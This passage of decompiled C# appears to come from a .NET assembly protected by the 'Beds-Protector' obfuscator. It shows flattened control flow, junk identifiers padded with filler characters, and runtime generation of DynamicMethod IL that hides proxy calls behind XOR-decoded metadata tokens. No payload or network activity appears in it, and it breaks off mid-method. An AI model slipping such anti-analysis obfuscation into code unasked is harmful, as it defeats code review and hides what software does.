  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogEThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogEᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] bool obj1)
  {
    int num = 44101 + 11058 - 55159;
    do
    {
      if (num == 26829 + 51213 - 78041)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogUAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogUAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.Ð\u00ACZðY(obj0, obj1);
        num = 36739 + 45983 - 82720;
      }
      if (num == 31960 - 5487 - 26473)
        num = 82381 - 11294 - 71086;
    }
    while (num != 86758 - 85916 - 840);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogfThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogfᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] object obj1)
  {
    int num = 31360 - 24811 - 6549;
    do
    {
      if (num == 6810 + 87040 - 93849)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogvAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogvAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u0032\u0028\u0081È\u00AE(obj0, obj1);
        num = 79992 - 136829 + 56839;
      }
      if (num == 27463 + 44000 - 71463)
        num = 15626 - 83287 + 67662;
    }
    while (num != 51086 - 67807 + 16723);
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogFThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogFᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0)
  {
    int num = 38155 + 59854 - 98009;
    do
    {
      if (num == 94403 - 54926 - 39477)
        num = 95702 - 65626 - 30075;
    }
    while (num != 94523 - 154411 + 59889);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogsAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogsAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u002CáK\u0010\u0006(obj0);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoggThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoggᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] bool obj1)
  {
    int num = 93935 - 49236 - 44699;
    do
    {
      if (num == 86817 - 77282 - 9534)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogUAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogUAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u00ACÕ\u00A8cR(obj0, obj1);
        num = 76890 + 32 - 76920;
      }
      if (num == 61310 - 100431 + 39121)
        num = 21202 - 14872 - 6329;
    }
    while (num != 45103 + 11257 - 56358);
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogGThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogGᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ()
  {
    int num = 27935 + 58810 - 86745;
    do
    {
      if (num == 54362 - 49137 - 5225)
        num = 90013 + 2831 - 92843;
    }
    while (num != 67071 - 88308 + 21238);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogZAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogZAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u0003\u00A14\u00ABa();
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoghThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoghᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] object obj1)
  {
    int num = 63773 - 86524 + 22751;
    do
    {
      if (num == 96950 - 190917 + 93968)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogvAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogvAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u00F7ëUNº(obj0, obj1);
        num = 26763 - 22550 - 4211;
      }
      if (num == 58128 - 92502 + 34374)
        num = 39802 - 69613 + 29812;
    }
    while (num != 58887 - 92311 + 33426);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogHThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogHᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0)
  {
    int num = 33148 - 119531 + 86383;
    do
    {
      if (num == 73716 - 48525 - 25190)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog4AThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog4AᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.W\u0086cö\u000B(obj0);
        num = 73144 - 63731 - 9411;
      }
      if (num == 39474 - 51316 + 11842)
        num = 15992 + 16690 - 32681;
    }
    while (num != 55682 - 141431 + 85751);
  }

  static bool Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogiThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogiᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ()
  {
    int num = 35550 + 16369 - 51919;
    do
    {
      if (num == 12360 - 99885 + 87525)
        num = 28096 + 52147 - 80242;
    }
    while (num != 52370 - 24010 - 28359);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog5AThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog5AᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.õîWï\u0085();
  }

  static bool Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogIThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogIᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ()
  {
    int num = 75412 - 11656 - 63756;
    do
    {
      if (num == 59416 - 52524 - 6892)
        num = 34854 - 84610 + 49757;
    }
    while (num != 97561 - 87069 - 10491);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog5AThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog5AᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u0003Òù\u0026a();
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogjThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogjᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] string obj0)
  {
    int num = 84556 - 129378 + 44822;
    do
    {
      if (num == 92368 - 74275 - 18092)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogRAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogRAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u001C\u00B2\u0097Ò\u0016(obj0);
        num = 1693 - 2698 + 1007;
      }
      if (num == 4887 + 44061 - 48948)
        num = 18445 + 81507 - 99951;
    }
    while (num != 98858 - 63826 - 35030);
  }

  static bool Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogJThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogJᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0)
  {
    int num = 44948 - 19936 - 25012;
    do
    {
      if (num == 81052 - 121095 + 40043)
        num = 48085 - 147121 + 99037;
    }
    while (num != 25788 - 18308 - 7479);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogcbThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogcbᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.e\u00213Á\u00A8(obj0);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogkThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogkᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] string obj0)
  {
    int num = 35993 - 35547 - 446;
    do
    {
      if (num == 55777 + 41427 - 97203)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogRAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogRAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.Ê9ÏîO(obj0);
        num = 42702 - 101943 + 59243;
      }
      if (num == 62149 - 92589 + 30440)
        num = 27351 - 25925 - 1425;
    }
    while (num != 14807 - 27941 + 13136);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogKThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogKᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0)
  {
    int num = 61547 + 6940 - 68487;
    do
    {
      if (num == 14726 - 17757 + 3032)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog4AThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog4AᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u007F\u000B\u005C\u002E\u008C(obj0);
        num = 85478 - 62248 - 23228;
      }
      if (num == 79385 + 4779 - 84164)
        num = 19054 - 82345 + 63292;
    }
    while (num != 93528 - 69817 - 23709);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog5bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog5bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 44481 + 48502 - 92983;
    Type[] parameterTypes;
    FieldInfo fieldFromHandle;
    MethodInfo methodInfo;
    MethodBase method;
    Type declaringType;
    DynamicMethod dynamicMethod;
    Type fieldType;
    do
    {
      int index1;
      if (num1 == 2748 - 64516 + 61791)
      {
        ++index1;
        num1 = 75786 - 145857 + 70095;
      }
      if (num1 == 94572 - 127273 + 32711)
        return;
      if (num1 != 85901 - 1046 - 84831)
        goto label_7;
label_5:
      if (index1 >= parameterTypes.Length)
        num1 = 27228 + 38992 - 66195;
      else
        goto label_12;
label_7:
      byte[] numArray;
      int num2;
      int metadataToken;
      if (num1 == 97413 - 121708 + 24299)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[0] ^ (int) numArray[num5 = num4 - 1]) << 24);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[2] ^ (int) numArray[num2 = num7 - 1]) << 16;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog6bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog6bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 73975 - 58475 - 15495;
      }
      MethodInfo[] methods;
      if (num1 == 75079 - 293 - 74773)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 67148 - 43852 - 23282;
      }
      if (num1 != 77715 - 115523 + 37830)
        goto label_13;
label_12:
      ParameterInfo[] parameters;
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 59712 + 20152 - 79841;
label_13:
      if (num1 != 63134 + 6696 - 69814)
        goto label_15;
label_14:
      int index2;
      methodInfo = methods[index2];
      num1 = 32937 - 82724 + 49804;
label_15:
      if (num1 == 90516 - 101495 + 11004)
      {
        declaringType = method.DeclaringType;
        num1 = 52283 + 4799 - 57056;
      }
      if (num1 != 78461 - 165250 + 86800)
        goto label_19;
label_18:
      dynamicMethod = (DynamicMethod) null;
      num1 = 57513 - 141631 + 84130;
label_19:
      if (num1 == 68683 - 50440 - 18231)
      {
        parameterTypes = (Type[]) null;
        num1 = 46295 - 6579 - 39703;
      }
      if (num1 == 95322 - 75437 - 19876)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 9429 - 76391 + 66972;
      }
      if (num1 == 41533 - 56169 + 14655)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 77358 + 4989 - 82327;
      }
      if (num1 == 96381 - 161418 + 65042)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 74495 - 146251 + 71762;
      }
      if (num1 == 4490 - 14412 + 9942)
      {
        index1 = 0;
        num1 = 17717 - 96983 + 79287;
      }
      if (num1 == 36481 - 21246 - 15217)
      {
        parameters = methodInfo.GetParameters();
        num1 = 53699 - 129100 + 75420;
      }
      if (num1 == 61609 - 99833 + 38232)
      {
        if (method.IsStatic)
          num1 = 33379 + 30111 - 63481;
        else
          goto label_18;
      }
      if (num1 != 29927 - 35164 + 5258)
      {
        if (num1 == 42400 - 64639 + 22240)
        {
          fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
          num1 = 4472 - 91082 + 86612;
        }
        if (num1 == 19087 - 64393 + 45313)
        {
          fieldType = fieldFromHandle.FieldType;
          num1 = 46468 - 16033 - 30427;
        }
        if (num1 == 29760 - 68480 + 38737)
        {
          if ((object) methodInfo.DeclaringType == (object) fieldType)
          {
            num1 = 40589 - 81271 + 40700;
          }
          else
          {
            ++index2;
            goto label_57;
          }
        }
        if (num1 == 51754 - 66031 + 14279)
        {
          numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
          num1 = 32662 + 39235 - 71894;
        }
        if (num1 == 44095 - 70953 + 26861)
        {
          num2 = numArray.Length;
          num1 = 815 + 1560 - 2371;
        }
        if (num1 != 66504 - 73502 + 7013)
        {
          if (num1 == 2035 + 57047 - 59068)
          {
            index2 = 0;
            num1 = 28690 + 28605 - 57280;
          }
          if (num1 == 30106 - 11504 - 18596)
          {
            method = fieldFromHandle.Module.ResolveMethod(metadataToken);
            num1 = 52212 + 7805 - 60010;
          }
          if (num1 == 24744 - 32884 + 8140)
            num1 = 64558 - 139988 + 75431;
          continue;
        }
label_57:
        if (index2 < methods.Length)
          goto label_14;
        else
          goto label_58;
      }
      else
        goto label_5;
    }
    while (num1 != 53125 - 23008 - 30091);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[4] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog6bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog6bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog7bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog7bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 50345 - 145208 + 94863;
    FieldInfo fieldFromHandle;
    Type fieldType;
    MethodBase method;
    MethodInfo methodInfo;
    Type[] parameterTypes;
    DynamicMethod dynamicMethod;
    Type declaringType;
    do
    {
      if (num1 == 59750 - 10121 - 49620)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 42942 - 124279 + 81347;
      }
      int index1;
      if (num1 == 23413 - 25684 + 2288)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 23521 - 64441 + 40938;
        }
        else
        {
          ++index1;
          goto label_57;
        }
      }
      byte[] numArray;
      int num2;
      if (num1 == 81631 - 28406 - 53222)
      {
        num2 = numArray.Length;
        num1 = 56999 - 28757 - 28238;
      }
      int metadataToken;
      if (num1 == 12626 + 53298 - 65919)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 66850 - 122074 + 55230;
      }
      if (num1 == 94230 - 26044 - 68179)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 31581 - 103723 + 72150;
      }
      if (num1 != 85124 - 13478 - 71631)
      {
        if (num1 == 7660 - 42835 + 35176)
        {
          fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
          num1 = 37248 - 50373 + 13127;
        }
        if (num1 != 57722 - 51902 - 5796)
          goto label_18;
      }
      else
        goto label_57;
label_16:
      int index2;
      if (index2 >= parameterTypes.Length)
        num1 = 67202 - 136306 + 69129;
      else
        goto label_27;
label_18:
      if (num1 == 22209 - 116222 + 94036)
      {
        ++index2;
        num1 = 1852 - 25915 + 24087;
      }
      MethodInfo[] methods;
      if (num1 == 28944 - 69641 + 40710)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 94390 - 16358 - 78018;
      }
      if (num1 == 13168 - 110971 + 97811)
      {
        if (method.IsStatic)
          num1 = 46712 + 30137 - 76840;
        else
          goto label_33;
      }
      if (num1 == 69306 - 15002 - 54294)
        return;
      if (num1 != 93062 - 41142 - 51898)
        goto label_28;
label_27:
      ParameterInfo[] parameters;
      parameterTypes[index2] = parameters[index2].ParameterType;
      num1 = 22824 + 52791 - 75592;
label_28:
      if (num1 == 49433 - 30394 - 19019)
      {
        index2 = 0;
        num1 = 99049 - 5743 - 93285;
      }
      if (num1 == 78113 - 87752 + 9653)
      {
        index1 = 0;
        num1 = 28425 + 47544 - 75954;
      }
      if (num1 != 76374 - 37912 - 38451)
        goto label_34;
label_33:
      dynamicMethod = (DynamicMethod) null;
      num1 = 35414 + 57157 - 92559;
label_34:
      if (num1 == 47513 + 15315 - 62826)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 28955 - 94452 + 65500;
      }
      if (num1 == 14834 - 61615 + 46787)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 8933 + 72071 - 80997;
      }
      if (num1 == 72188 - 155940 + 83771)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 65118 - 43415 - 21683;
      }
      if (num1 != 23477 + 58998 - 82459)
        goto label_42;
label_41:
      methodInfo = methods[index1];
      num1 = 4525 - 59633 + 55125;
label_42:
      if (num1 != 14999 + 67186 - 82164)
      {
        if (num1 == 8480 + 83513 - 91968)
        {
          declaringType = method.DeclaringType;
          num1 = 22231 + 59338 - 81543;
        }
        if (num1 == 16379 + 12765 - 29132)
        {
          parameterTypes = (Type[]) null;
          num1 = 53519 - 76806 + 23300;
        }
        if (num1 == 27986 + 46498 - 74480)
        {
          int num3;
          int num4;
          int num5;
          int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 24) + (((int) fieldFromHandle.Name[0] ^ (int) numArray[num5 = num4 - 1]) << 16);
          int num7 = num5 - 1;
          int num8 = ((int) fieldFromHandle.Name[3] ^ (int) numArray[num2 = num7 - 1]) << 8;
          metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog8bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog8bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
          num1 = 28655 - 87759 + 59109;
        }
        if (num1 == 92182 - 23851 - 68313)
        {
          parameters = methodInfo.GetParameters();
          num1 = 16767 - 26710 + 9962;
        }
        if (num1 == 65462 + 10100 - 75562)
          num1 = 7700 - 83832 + 76133;
        continue;
      }
      goto label_16;
label_57:
      if (index1 < methods.Length)
        goto label_41;
      else
        goto label_58;
    }
    while (num1 != 83335 - 57000 - 26309);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
